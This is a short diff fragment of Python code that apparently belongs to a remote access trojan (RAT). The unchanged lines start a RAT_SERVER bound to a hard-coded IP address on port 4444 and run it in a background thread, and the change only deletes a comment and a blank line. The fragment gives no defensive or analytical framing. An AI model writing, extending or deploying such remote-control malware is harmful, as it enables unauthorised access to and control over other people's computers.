@@ -20,8 +20,6 @@ def start_rat_server():
     rat = RAT_SERVER('81.167.27.70', 4444)
     rat.build_connection()
 
-
-# Create a new thread to run the RAT_SERVER
 rat_thread = threading.Thread(target=start_rat_server)
 rat_thread.start()
 
